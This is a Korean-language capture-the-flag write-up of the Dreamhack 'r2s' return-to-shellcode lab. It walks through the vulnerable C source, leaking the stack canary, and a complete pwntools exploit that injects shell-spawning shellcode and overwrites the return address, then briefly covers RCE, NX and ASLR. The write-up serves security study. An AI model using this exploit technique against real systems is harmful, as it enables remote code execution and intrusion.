#canary #RAO #shellcode 

### 1. 파일 정보

 file ./r2s
./r2s: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=15e9dea98164c863a718820de5bd4261ea48e1d7, not stripped

checksec --file=./r2s
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX disabled   PIE enabled     No RPATH   No RUNPATH   72 Symbols        No    0               3               ./r2s

### 2. C 소스 코드 분석
``` c
// Name: r2s.c
// Compile: gcc -o r2s r2s.c -zexecstack -fstack-protector

#include <stdio.h>
#include <unistd.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

int main() {
  char buf[0x50];

  init();

  /*
  buf가 메모리의 어디에 있는지 주소 출력
  __builtin_farme_address() : 현재 함수의 프레임 포인터(rbp) 주소를 반환해 줌.
  buf가 rbp로부터 얼마나 떨어져 있는지 나타냄 → 결과는 스택에서 buf까지의 거리 (바이트 단위)
  */
  printf("Address of the buf: %p\n", buf);
  printf("Distance between buf and $rbp: %ld\n",
         (char*)__builtin_frame_address(0) - buf);
  
  /*
  fflush(stdout) : 표준출력 버퍼를 강제로 비움
  이유는 표준출력은 기본적으로 버퍼링됨(특히 stdout이 터미널이 아닌 경우)
  printf("Input: ");까지만 쳤을 경우, 아직 출력 버퍼에만 있고 사용자에게는 안 보일 수 있음.
  그래서 fflush를 호출하여 지금까지의 출력이 즉시 터미널로 보내지게 함.
  */
  printf("[1] Leak the canary\n");
  printf("Input: ");
  fflush(stdout);

  read(0, buf, 0x100);
  printf("Your input is '%s'\n", buf);

  puts("[2] Overwrite the return address");
  printf("Input: ");
  fflush(stdout);
  gets(buf);

  return 0;
}

```

### 3. 취약점 탐색

buf 의 주소 및 rbp 와 buf 사이의 주소 차이를 알려주고 있다.
``` c
printf("Address of the buf: %p\n", buf);
printf("Distance between buf and $rbp: %ld\n",
        (char*)__builtin_frame_address(0) - buf);
```

스택 버퍼인 buf 에 총 두번의 입력을 받고 있다. 그런데 두 입력 모두에서 오버플로우가 발생한다는 것을 알 수 있다.
``` c
char buf[0x50];

read(0, buf, 0x100);   // 0x50 < 0x100
gets(buf);             // Unsafe function
```

### 4. 익스플로잇 시나리오

카나리 우회
: 첫번째 입력에서 카나리를 먼저 구하고, 이를 두 번째 입력에 사용해야 함.
: 첫번재 입력의 바로 뒤에서 buf를 문자열로 출력해 주기 때문에, buf에 적절한 오버플로우를 발생시키면 카나리 값을 구할 수 있을 것이다.

셸 획득
: 카나리를 구했으면, 이제 두 번째 입력으로 반환 주소를 덮을 수 있다.
: 그런데 바이너리에는 셸을 획득하는 함수(get_shell)가 없다.
: 따라서 셸을 획득하는 코드를 직접 주입하고, 해당 주소로 실행 흐름을 옮겨야 한다.
: 주소를 알고 있는 buf에 셸코드를 주입하고, 해당 주소로 실행 흐름을 옮기면 셸을 획득 할 수 있다.

### 5. 익스플로잇

#### 스택 프래임 정보 수집

``` 
$ python3 ./r2s.py
[+] Starting local process './r2s': pid 8501
[+] Address of buf: 0x7ffe1d28c570
[+] buf <=> sfp: 0x60
[+] buf <=> canary: 0x58
```

``` python
#!/usr/bin/env python3
# Name: r2s.py

from pwn import *

# 익스플로잇 스크립트에서 **값 출력(logging)**을 예쁘게 해주는 역할을 하는 유틸리티 함수
# success함수: pwntools의 함수로, 메시지를 [+] 로 시작. 초록색으로 출력
# hex(m): int타입의 숫자를 16진수 문자열로 변환(예. 0xdeadbeef)
def slog(n, m): return success(': '.join([n, hex(m)]))

p = process('./r2s')
# p = remote('host3.dreamhack.games', 12527)

context.arch = 'amd64'

# [1] Get information about bof

# recvline(): 한줄 전체를 바이트 타입으로 받음.
# 위에서 받은 바이트 문자열의 마지막 문자 \n(newline)을 제외 시킴. 
# 바이트 문자열을 16진수 정수로 바꿈 
## 왜 문자열 말고 정수형으로 변환할까?
## 주소 연산이 불가능 함.
## ROP gadget이나 shellcode 위치 지정 불가능
## 메모리 비교 및 조건 차리에 서 불편
p.recvuntil(b'buf: ')
buf = int(p.recvline()[:-1], 16)
slog('Address of buf', buf)

# C코드에서 $rbp: 다음으로 결과가 나오는 값을 받기 위해 recvline()으로 받음
# 이때 받은 데이터의 마지막에 \n도 함께 받게됨.
# 이것을 떼어내기 위해 split()으로 공백을 떼어내게 되는데 \n은 공백처럼 인식되어서 분리되게 됨.
# 분리된 데이터의 첫번째 값만 추출.
p.recvuntil(b'$rbp: ')
buf2rsp = int(p.recvline().split()[0])
buf2cnry = buf2rsp - 8
slog('buf <=> sfp', buf2rsp)
slog('buf <=> canary', buf2cnry)
```


#### 카나리 릭
![](https://dreamhack-lecture.s3.amazonaws.com/media/ebaccb041e9c0f17784898d04ce56dd3bb1ac57aa220dfdc4c97cfce6ac54ea3.png)
스택 프래임에 대한 정보를 수집했으므로, 이를 활용하여 카나리를 구해야 함.
buf와 카나리 사이를 임의의 값으로 채우면, 프로그램에서 buf를 출력할 때 카나리가 같이 출력될 것임.

```
$ python3 ./r2s.py
[+] Starting local process './r2s': pid 8564
[+] Address of buf: 0x7ffe58a8d740
[+] buf <=> sfp: 0x60
[+] buf <=> canary: 0x58
[+] Canary: 0x40e736d41cd76400
```

``` python
# [2] Leak canary value

# +1을 해 준 이유
# 스택 카나리의 첫 바이트는 항상 \x00이 들어가 있음.
# 이것을 'A'로 덮어씌워서 카나리의 7바이트값을 확인할 수 있게 됨
payload = b'A' * (buf2cnry + 1)

# 'Input:' 프롬프트가 출력될때까지 기다린 다음에 payload 전송
# payload가 프로그램에 전달되어 스택 위에 있는 카나리 값이 노출될 수 있게 유도
# recvuntil(payload): 우리가 보낸 입력을 프로그램이 출력할 때까지 기다림
# p가 payload를 출력할 때까지 데이터를 수신함.
# 왜???? 그 다음에 오는 메모리 누출값(예. 카나리)를 정확히 받기 위해.
# ==> payload 전송 직후에 바로 recv()를 쓰면,
# 네트워크 통신이나 로컬 파이프에서는 입력한 payload도 섞여서 출력에 포함되기 때문에,
# 그걸 먼저 걸러내야 그 뒤에 나오는 canary 값을 정확히 추출할 수 있어요.

# recvn(7)로 다음의 7바이트를 받아들임.
# 맨 앞에 \x00을 붙여서 총 8바이트로 만든 후 u64()로 64비트 리틀 엔디언 정수로 변환
# 예시.
# p.recvn(7) = b'\xde\xad\xbe\xef\x11\x22\x33'
# b'\x00' + ... = b'\x00\xde\xad\xbe\xef\x11\x22\x33'
# u64(...) → 0x332211efbeadde00
# u64를 쓰는 이유????
# 여기서 u64()는 이 8바이트를 정수로 바꿔줘야 우리가 나중에 스택 카나리를 우회하거나 비교할 수 있어.
# 즉, 바이트열을 사람이 쓸 수 있는 정수값으로 변환하는 게 목적!
# p64 : 정수를 바이트로 만드는 함수.
p.sendafter(b'Input:', payload)
p.recvuntil(payload)
cnry = u64(b'\x00' + p.recvn(7))
slog('Canary', cnry)
```

#### 익스플로잇

카나리를 구했으므로 이제 buf에 셸코드를 주입하고, 카나리를 구한 값으로 덮은 뒤, 반환 주소 (RET)를 buf로 덮으면 셸코드가 실행되게 할 수 있다.

![](https://dreamhack-lecture.s3.amazonaws.com/media/7769fa0eaf08ea7db1bd568d23f5a5cd057afc14381665542dd3580366f12f90.png)

``` python
# [3] Exploit

# shellcraft.sh()는 쉘코드(쉘을 여는 어셈블리 코드)를 생성함
# asm(...)은 그 어셈블리 코드를 **기계어(bytecode)**로 변환해 줌
# sh.ljust(buf2cnry, b'A') :
# shellcode를 buf2cnry 길이만큼 맞추기 위해 뒤에 여백부분을 'A'로 패딩을 넣음
# 즉, buf부터 canary 전까지 정확히 채움
# [ shellcode ] + [ 패딩 ] + [ canary ] + [ SFP ] + [ RIP ]
# 
# p.sendlineafter(b'Input:', payload)
# "Input:" 메시지가 뜨면 payload를 전송
# sendline은 마지막에 \n 자동으로 붙여줌 (중요: gets()/read()는 이걸로 입력 끝 감지함)
# C코드에서 Input 다음에 gets()함수로 데이터를 받는데 gets()는 \n까지 포함해서 데이터를 넘긴다.
# 해서, sendlineafter를 사용한 것임.
sh = asm(shellcraft.sh())
payload = sh.ljust(buf2cnry, b'A') + p64(cnry) + b'B' * 0x8 + p64(buf)
# gets() receives input until '\n' is received
p.sendlineafter(b'Input:', payload)

p.interactive()
```

### 정리

이 공격 기법은 다음 조건이 만족하면 사용할 수 있다.
1. 코드를 삽입할 수 있는 임의의 버퍼가 있을 때, 해당 버퍼의 주소를 알거나, 구할 수 있다.
2. 실행 흐름을 옮길 수 있다 <- 스택 버퍼 오버플로우도 여기 포함된다.

##### ACE (Arbitrary Code Execution)
임의의 코드를 실행하는 것

##### RCE (Remote Code Execution)
원격 서버를 대상으로 ACE를 수행하는 것
Return to Shellcode 는 RCE 기법중 하나.

RCE는 서버를 대상으로 한 공격들 중, 매우 파괴적인 공격에 속하며, 컴퓨터 과학자들은 서버에서 RCE의 위험을 줄이기 위해 여러 보호 기법을 고안하고 있다.

NX(Not eXecutable)
: 코드 섹션 외의 모든 섹션에 실행 권한을 없앰.

ASLR(Address Space Layout Randomization)
: 바이너리를 실행할 때마다 임의의 주소에 스택과 힙을 할당.